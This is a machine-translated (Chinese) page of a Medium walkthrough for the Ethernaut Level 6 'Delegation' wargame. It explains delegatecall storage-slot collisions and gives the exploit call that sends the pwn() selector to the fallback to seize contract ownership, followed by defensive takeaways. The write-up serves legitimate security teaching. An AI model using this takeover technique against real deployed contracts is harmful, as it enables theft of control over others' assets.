<html>
<head>
<title>Ethernaut Level 6 Delegation [Foundry-Hardhat]</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">以太6级授权[铸造-安全帽]</h1>
<blockquote>原文：<a href="https://medium.com/coinmonks/ethernaut-level-6-delegation-foundry-hardhat-917faaff3570?source=collection_archive---------23-----------------------#2022-12-20">https://medium.com/coinmonks/ethernaut-level-6-delegation-foundry-hardhat-917faaff3570?source=collection_archive---------23-----------------------#2022-12-20</a></blockquote><div><div class="ef hh hi hj hk hl"/><div class="hm hn ho hp hq"><div class=""/><figure class="fi fk ir is it iu fe ff paragraph-image"><div role="button" tabindex="0" class="iv iw di ix bf iy"><div class="fe ff iq"><img src="../Images/93b8bac9a140a15aa9762d669edd605e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ex_k9sB8Od-8ah2r0f5ETQ.png"/></div></div></figure><blockquote class="jb"><p id="6b92" class="jc jd ht bd je jf jg jh ji jj jk jl ek translated"><em class="jm"/><a class="ae jn" href="https://github.com/Chirag21/Ethernaut-solutions" rel="noopener ugc nofollow" target="_blank"><strong class="ak"><em class="jm">Ethernaut-Solutions</em></strong></a><em class="jm">资源库包含了使用Foundry和Hardhat的解决方案。</em></p></blockquote><p id="613f" class="pw-post-body-paragraph jo jp ht jq b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk jl hm dt translated">这个水平说明了如何滥用<code class="eh kl km kn ko b"><a class="ae jn" href="https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-and-libraries" rel="noopener ugc nofollow" target="_blank">delegatecall</a></code>。</p><blockquote class="jb"><p id="c79a" class="jc jd ht bd je jf kp kq kr ks kt jl ek translated">从顶级交易者那里复制交易机器人。免费试一试<a class="ae jn" href="https://coincodecap.com/go/pionex-coinmonks" rel="noopener ugc nofollow" target="_blank"/>。</p></blockquote><h1 id="bc35" class="ku kv ht bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr dt translated">目标</h1><ul class=""><li id="1df7" class="ls lt ht jq b jr lu jv lv jz lw kd lx kh ly jl lz ma mb mc dt translated">这个级别要求我们声明对合同的所有权。</li></ul></div><div class="ab cl md me hb mf" role="separator"><span class="mg bw bk mh mi mj"/><span class="mg bw bk mh mi mj"/><span class="mg bw bk mh mi"/></div><div class="hm hn ho hp hq"><p id="6086" class="pw-post-body-paragraph jo jp ht jq b jr mk jt ju jv ml jx jy jz mm kb kc kd mn kf kg kh mo kj kk jl hm dt translated"><code class="eh kl km kn ko b">delegatecall</code></p><p id="1a05" class="pw-post-body-paragraph jo jp ht jq b jr mk jt ju jv ml jx jy jz mm kb kc kd mn kf kg kh mo kj kk jl hm dt translated"><code class="eh kl km kn ko b">delegatecall</code>是Solidity中一个特殊的低级调用，用于对另一个合同进行外部调用。除了目标地址处的代码在调用契约的上下文(即，在该地址)中执行，并且<code class="eh kl km kn ko b">msg.sender</code>和<code class="eh kl km kn ko b">msg.value</code>不变之外，它与消息调用相同。</p><p id="4a72" class="pw-post-body-paragraph jo jp ht jq b jr mk jt ju jv ml jx jy jz mm kb kc kd mn kf kg kh mo kj kk jl hm dt translated">这意味着契约可以在运行时从不同的地址动态加载代码。存储、当前地址、余额仍参考调用合同；只有代码是从被叫地址获取的。delegatecall的优点是您可以保留当前调用协定的上下文。</p><blockquote class="mp mq mr"><p id="b430" class="jo jp ms jq b jr mk jt ju jv ml jx jy mt mm kb kc mu mn kf kg mv mo kj kk jl hm dt translated">以太坊将数据存储在存储“<a class="ae jn" href="https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html" rel="noopener ugc nofollow" target="_blank">槽</a>”中，这是32字节大小的槽。每次将变量保存到存储器时，它会自动占用序列中当前槽或下一个槽的剩余空间<em class="ht">。</em></p></blockquote><p id="1204" class="pw-post-body-paragraph jo jp ht jq b jr mk jt ju jv ml jx jy jz mm kb kc kd mn kf kg kh mo kj kk jl hm dt translated">在下面的契约中，契约<code class="eh kl km kn ko b">A</code>对契约<code class="eh kl km kn ko b">B</code>的<code class="eh kl km kn ko b">setTo5()</code>函数进行委托调用。尽管该函数存在于契约<code class="eh kl km kn ko b">B</code>中，但是变量<code class="eh kl km kn ko b">foo</code>的值在契约<code class="eh kl km kn ko b">A</code>中被改变。合同<code class="eh kl km kn ko b">B</code>的代码通过合同<code class="eh kl km kn ko b">A</code>的存储、<code class="eh kl km kn ko b">msg.sender</code>和<code class="eh kl km kn ko b">msg.value</code>执行。</p><figure class="mx my mz na fq iu fe ff paragraph-image"><div role="button" tabindex="0" class="iv iw di ix bf iy"><div class="fe ff mw"><img src="../Images/66808986f10a8bb7283507ccce79f5c8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*io4stRY0Wl7g5vPNovWpKA.png"/></div></div></figure><p id="bf2d" class="pw-post-body-paragraph jo jp ht jq b jr mk jt ju jv ml jx jy jz mm kb kc kd mn kf kg kh mo kj kk jl hm dt translated">这意味着来自一个契约的代码可以用来改变另一个契约的存储。我们将在这一关利用这种行为。</p><blockquote class="mp mq mr"><p id="258c" class="jo jp ms jq b jr mk jt ju jv ml jx jy mt mm kb kc mu mn kf kg mv mo kj kk jl hm dt translated">如果通过低级delegatecall访问状态变量，则两个协定的存储布局必须对齐，以便被调用的协定能够通过名称正确地访问调用协定的存储变量。当然，如果存储指针作为函数参数传递，就不是这种情况了，就像高级库的情况一样。</p></blockquote></div><div class="ab cl md me hb mf" role="separator"><span class="mg bw bk mh mi mj"/><span class="mg bw bk mh mi mj"/><span class="mg bw bk mh mi"/></div><div class="hm hn ho hp hq"><h1 id="539d" class="ku kv ht bd kw kx nb kz la lb nc ld le lf nd lh li lj ne ll lm ln nf lp lq lr dt translated">分析</h1><ul class=""><li id="aade" class="ls lt ht jq b jr lu jv lv jz lw kd lx kh ly jl lz ma mb mc dt translated">有两种合同:委托和授权。委托合同制作<code class="eh kl km kn ko b">delegatecall</code>委托合同。</li><li id="dbd9" class="ls lt ht jq b jr ng jv nh jz ni kd nj kh nk jl lz ma mb mc dt translated">委托契约有一个公共函数<code class="eh kl km kn ko b">pwn()</code>，它将<code class="eh kl km kn ko b">owner</code>设置为<code class="eh kl km kn ko b">msg.sender</code>，即调用该函数的人。</li></ul><pre class="mx my mz na fq nl ko nm bn nn no bi"><span id="2370" class="np kv ht ko b be nq nr l ns nt">contract Delegate {<br/>    address public owner;   // Slot 0<br/>    function pwn() public {<br/>        owner = msg.sender; // Saves msg.sender to slot 0<br/>    }<br/>}</span></pre><ul class=""><li id="38bb" class="ls lt ht jq b jr mk jv ml jz nu kd nv kh nw jl lz ma mb mc dt translated">请注意，在委托契约中，槽0处也有一个所有者变量</li></ul><pre class="mx my mz na fq nl ko nm bn nn no bi"><span id="7357" class="np kv ht ko b be nq nr l ns nt">contract Delegation {<br/>  address public owner;    // Slot 0<br/>  Delegate delegate;       // Slot 1<br/>  ...<br/>}</span></pre><ul class=""><li id="9fcd" class="ls lt ht jq b jr mk jv ml jz nu kd nv kh nw jl lz ma mb mc dt translated">委托合同有一个<code class="eh kl km kn ko b">fallback()</code>函数，它对委托合同进行委托调用。</li></ul><pre class="mx my mz na fq nl ko nm bn nn no bi"><span id="1cd5" class="np kv ht ko b be nq nr l ns nt">fallback() external {<br/>  (bool result,) = address(delegate).delegatecall(msg.data);<br/>}</span></pre><p id="5ef0" class="pw-post-body-paragraph jo jp ht jq b jr mk jt ju jv ml jx jy jz mm kb kc kd mn kf kg kh mo kj kk jl hm dt translated">从“1级回退”中记住，当没有匹配的<code class="eh kl km kn ko b"><a class="ae jn" href="https://solidity-by-example.org/function-selector/" rel="noopener ugc nofollow" target="_blank">function selector</a></code>时，调用<code class="eh kl km kn ko b">fallback()</code>函数。我们可以通过在事务中发送<code class="eh kl km kn ko b">data</code>来调用<code class="eh kl km kn ko b">public</code>和<code class="eh kl km kn ko b">external</code>函数。这个<code class="eh kl km kn ko b">data</code>就是编码<code class="eh kl km kn ko b"><a class="ae jn" href="https://solidity-by-example.org/function-selector/" rel="noopener ugc nofollow" target="_blank">function selector</a></code>和<code class="eh kl km kn ko b">function arguments</code>。</p><ul class=""><li id="94f4" class="ls lt ht jq b jr mk jv ml jz nu kd nv kh nw jl lz ma mb mc dt translated">为了利用契约，我们需要触发委托契约的<code class="eh kl km kn ko b">fallback()</code>函数，将<code class="eh kl km kn ko b">msg.data</code>作为<code class="eh kl km kn ko b">pwn()</code>函数的<code class="eh kl km kn ko b">function selector</code>传递。这将通过对委托合同进行委托调用来触发<code class="eh kl km kn ko b">pwn()</code>函数。注意两个合同库<code class="eh kl km kn ko b">owner</code>的<code class="eh kl km kn ko b">Slot 0</code>。由于是<code class="eh kl km kn ko b">delegatecall</code>，调用合同即委托合同的存储被修改，使<code class="eh kl km kn ko b">msg.sender</code>成为委托合同的新<code class="eh kl km kn ko b">owner</code>。</li></ul></div><div class="ab cl md me hb mf" role="separator"><span class="mg bw bk mh mi mj"/><span class="mg bw bk mh mi mj"/><span class="mg bw bk mh mi"/></div><div class="hm hn ho hp hq"><h1 id="9709" class="ku kv ht bd kw kx nb kz la lb nc ld le lf nd lh li lj ne ll lm ln nf lp lq lr dt translated">剥削</h1><ul class=""><li id="db42" class="ls lt ht jq b jr lu jv lv jz lw kd lx kh ly jl lz ma mb mc dt translated">首先，获取<code class="eh kl km kn ko b">pwn()</code>功能的功能选择器。pwn()的选择器是<code class="eh kl km kn ko b">0xdd365b8b</code>。</li></ul><pre class="mx my mz na fq nl ko nm bn nn no bi"><span id="1929" class="np kv ht ko b be nq nr l ns nt">const selector = web3.eth.abi.encodeFunctionSignature('pwn()')</span></pre><ul class=""><li id="8bea" class="ls lt ht jq b jr mk jv ml jz nu kd nv kh nw jl lz ma mb mc dt translated">检查电流<code class="eh kl km kn ko b">owner</code>。</li></ul><pre class="mx my mz na fq nl ko nm bn nn no bi"><span id="d5aa" class="np kv ht ko b be nq nr l ns nt">await contract.owner()</span></pre><ul class=""><li id="953a" class="ls lt ht jq b jr mk jv ml jz nu kd nv kh nw jl lz ma mb mc dt translated">调用<code class="eh kl km kn ko b">Delegation.sol</code>的回退功能</li></ul><pre class="mx my mz na fq nl ko nm bn nn no bi"><span id="3731" class="np kv ht ko b be nq nr l ns nt">await contract.sendTransaction({<br/>    from: player,<br/>    data: selector<br/>})</span></pre><p id="b089" class="pw-post-body-paragraph jo jp ht jq b jr mk jt ju jv ml jx jy jz mm kb kc kd mn kf kg kh mo kj kk jl hm dt translated">这会将您的地址设置为新的所有者。</p><ul class=""><li id="2606" class="ls lt ht jq b jr mk jv ml jz nu kd nv kh nw jl lz ma mb mc dt translated">查查车主</li></ul><pre class="mx my mz na fq nl ko nm bn nn no bi"><span id="b831" class="np kv ht ko b be nq nr l ns nt">await contract.owner()</span></pre><p id="5f08" class="pw-post-body-paragraph jo jp ht jq b jr mk jt ju jv ml jx jy jz mm kb kc kd mn kf kg kh mo kj kk jl hm dt translated">这将返回您的地址。这将返回您的地址。通过将事务发送给<code class="eh kl km kn ko b">Delegation</code>契约，使用<code class="eh kl km kn ko b">delegatecall</code>在<code class="eh kl km kn ko b">Delegation</code>契约的上下文中调用<code class="eh kl km kn ko b">Delegate</code>契约的<code class="eh kl km kn ko b">pwn()</code>函数，并修改存储。</p><p id="5dec" class="pw-post-body-paragraph jo jp ht jq b jr mk jt ju jv ml jx jy jz mm kb kc kd mn kf kg kh mo kj kk jl hm dt translated">提交实例。</p><p id="cf83" class="pw-post-body-paragraph jo jp ht jq b jr mk jt ju jv ml jx jy jz mm kb kc kd mn kf kg kh mo kj kk jl hm dt translated">关卡通过！！！😄</p></div><div class="ab cl md me hb mf" role="separator"><span class="mg bw bk mh mi mj"/><span class="mg bw bk mh mi mj"/><span class="mg bw bk mh mi"/></div><div class="hm hn ho hp hq"><h1 id="d61a" class="ku kv ht bd kw kx nb kz la lb nc ld le lf nd lh li lj ne ll lm ln nf lp lq lr dt translated">关键要点</h1><ul class=""><li id="8a57" class="ls lt ht jq b jr lu jv lv jz lw kd lx kh ly jl lz ma mb mc dt translated">确保调用协定的存储槽与被调用协定的存储槽对齐，以避免意外分配。</li><li id="af64" class="ls lt ht jq b jr ng jv nh jz ni kd nj kh nk jl lz ma mb mc dt translated">使用<code class="eh kl km kn ko b">delegatecall</code>前，执行验证和条件检查。</li><li id="d9b6" class="ls lt ht jq b jr ng jv nh jz ni kd nj kh nk jl lz ma mb mc dt translated">当不需要改变合约存储时使用<code class="eh kl km kn ko b">staticcall</code>(调用<code class="eh kl km kn ko b">view</code>和<code class="eh kl km kn ko b">pure</code>函数)。</li><li id="5d18" class="ls lt ht jq b jr ng jv nh jz ni kd nj kh nk jl lz ma mb mc dt translated">不要<code class="eh kl km kn ko b">delegatecall</code>给不可信的代码。</li></ul></div><div class="ab cl md me hb mf" role="separator"><span class="mg bw bk mh mi mj"/><span class="mg bw bk mh mi mj"/><span class="mg bw bk mh mi"/></div><div class="hm hn ho hp hq"><blockquote class="jb"><p id="1d0a" class="jc jd ht bd je jf kp kq kr ks kt jl ek translated"><em class="jm"/><a class="ae jn" href="https://github.com/Chirag21/Ethernaut-solutions" rel="noopener ugc nofollow" target="_blank"><strong class="ak"><em class="jm">Ethernaut-Solutions</em></strong></a><em class="jm">资源库包含使用Foundry和Hardhat的解决方案。</em></p><p id="3af4" class="jc jd ht bd je jf kp kq kr ks kt jl ek translated"><em class="jm">解决方案采用铸造:- </em></p><p id="690d" class="jc jd ht bd je jf kp kq kr ks kt jl ek translated"><a class="ae jn" href="https://github.com/Chirag21/Ethernaut-Solutions-using-Foundry-Hardhat/blob/main/test/foundry/6_Delegation.t.sol" rel="noopener ugc nofollow" target="_blank"> <em class="jm">测试</em></a><em class="jm"/><a class="ae jn" href="https://github.com/Chirag21/Ethernaut-Solutions-using-Foundry-Hardhat/blob/main/script/6_DelegationScript.sol" rel="noopener ugc nofollow" target="_blank">漏洞利用脚本</a></p><p id="11fc" class="jc jd ht bd je jf kp kq kr ks kt jl ek translated"><em class="jm">使用安全帽的解决方案:- </em></p><p id="bace" class="jc jd ht bd je jf kp kq kr ks kt jl ek translated"><a class="ae jn" href="https://github.com/Chirag21/Ethernaut-Solutions-using-Foundry-Hardhat/blob/main/test/hardhat/6_delegation.test.ts" rel="noopener ugc nofollow" target="_blank"> <em class="jm"> Tes </em> t </a>，<a class="ae jn" href="https://github.com/Chirag21/Ethernaut-Solutions-using-Foundry-Hardhat/blob/main/scripts/6_delegation_exploit.ts" rel="noopener ugc nofollow" target="_blank"> <em class="jm">漏洞利用脚本</em> </a></p></blockquote><figure class="ny nz oa ob oc iu fe ff paragraph-image"><a href="https://www.buymeacoffee.com/0xcsp"><div class="fe ff nx"><img src="../Images/679392ad412abc67dd16f3b9fefa799d.png" data-original-src="https://miro.medium.com/v2/resize:fit:420/format:webp/1*769MixcK_s6-z4fwRrIpMQ.png"/></div></a></figure><h1 id="93ba" class="ku kv ht bd kw kx ky kz la lb lc ld le lf od lh li lj oe ll lm ln of lp lq lr dt translated">更多级别</h1><div class="og oh fm fo oi oj"><a rel="noopener follow" target="_blank" href="/coinmonks/ethernaut-level-7-force-foundry-hardhat-581e92687422"><div class="ok ab ej"><div class="ol ab om cl cj on"><h2 class="bd hu fv z el oo eo ep op er et hs dt translated">以太7级力量[铸造-安全帽]</h2><div class="oq l"><h3 class="bd b fv z el oo eo ep op er et ek translated">Ethernaut-Solutions存储库包含使用Foundry和Hardhat的解决方案。</h3></div><div class="or l"><p class="bd b gc z el oo eo ep op er et ek translated">medium.com</p></div></div><div class="os l"><div class="ot l ou ov ow os ox iz oj"/></div></div></a></div><div class="og oh fm fo oi oj"><a rel="noopener follow" target="_blank" href="/coinmonks/ethernaut-level-5-token-foundry-hardhat-d9d52e5ce39a"><div class="ok ab ej"><div class="ol ab om cl cj on"><h2 class="bd hu fv z el oo eo ep op er et hs dt translated">以太5级令牌[铸造厂-安全帽]</h2><div class="oq l"><h3 class="bd b fv z el oo eo ep op er et ek translated">Ethernaut-Solutions存储库包含使用Foundry和Hardhat的解决方案。</h3></div><div class="or l"><p class="bd b gc z el oo eo ep op er et ek translated">medium.com</p></div></div><div class="os l"><div class="oy l ou ov ow os ox iz oj"/></div></div></a></div><blockquote class="jb"><p id="33c4" class="jc jd ht bd je jf jg jh ji jj jk jl ek translated">加入Coinmonks <a class="ae jn" href="https://t.me/coincodecap" rel="noopener ugc nofollow" target="_blank">电报频道</a>和<a class="ae jn" href="https://www.youtube.com/c/coinmonks/videos" rel="noopener ugc nofollow" target="_blank"> Youtube频道</a>了解加密交易和投资</p></blockquote><h1 id="cd8b" class="ku kv ht bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr dt translated">另外，阅读</h1><ul class=""><li id="9ca7" class="ls lt ht jq b jr lu jv lv jz lw kd lx kh ly jl lz ma mb mc dt translated"><a class="ae jn" href="https://coincodecap.com/okex-kucoin" rel="noopener ugc nofollow" target="_blank"> OKEx vs KuCoin </a> | <a class="ae jn" href="https://coincodecap.com/celsius-alternatives" rel="noopener ugc nofollow" target="_blank">摄氏替代度</a> | <a class="ae jn" href="https://coincodecap.com/buy-vechain" rel="noopener ugc nofollow" target="_blank">如何购买VeChain </a></li><li id="a5ed" class="ls lt ht jq b jr ng jv nh jz ni kd nj kh nk jl lz ma mb mc dt translated"><a class="ae jn" href="https://coincodecap.com/profitfarmers-review" rel="noopener ugc nofollow" target="_blank"> ProfitFarmers回顾</a> | <a class="ae jn" href="https://coincodecap.com/cornix-trading-bot" rel="noopener ugc nofollow" target="_blank">如何使用Cornix交易机器人</a></li><li id="1730" class="ls lt ht jq b jr ng jv nh jz ni kd nj kh nk jl lz ma mb mc dt translated"><a class="ae jn" href="https://coincodecap.com/buy-bitcoin-anonymously" rel="noopener ugc nofollow" target="_blank">如何匿名购买比特币</a> | <a class="ae jn" href="https://coincodecap.com/bitcoin-cash-wallets" rel="noopener ugc nofollow" target="_blank">比特币现金钱包</a></li><li id="96a7" class="ls lt ht jq b jr ng jv nh jz ni kd nj kh nk jl lz ma mb mc dt translated"><a class="ae jn" href="https://coincodecap.com/wazirx-nft-review" rel="noopener ugc nofollow" target="_blank">瓦济里克斯NFT评论</a>|<a class="ae jn" href="https://coincodecap.com/bitsgap-vs-pionex" rel="noopener ugc nofollow" target="_blank">Bitsgap vs Pionex</a>|<a class="ae jn" href="https://coincodecap.com/tangem-wallet-review" rel="noopener ugc nofollow" target="_blank">Tangem评论</a></li><li id="cd21" class="ls lt ht jq b jr ng jv nh jz ni kd nj kh nk jl lz ma mb mc dt translated">如何使用Solidity在以太坊上创建DApp？</li></ul></div></div>    
</body>
</html>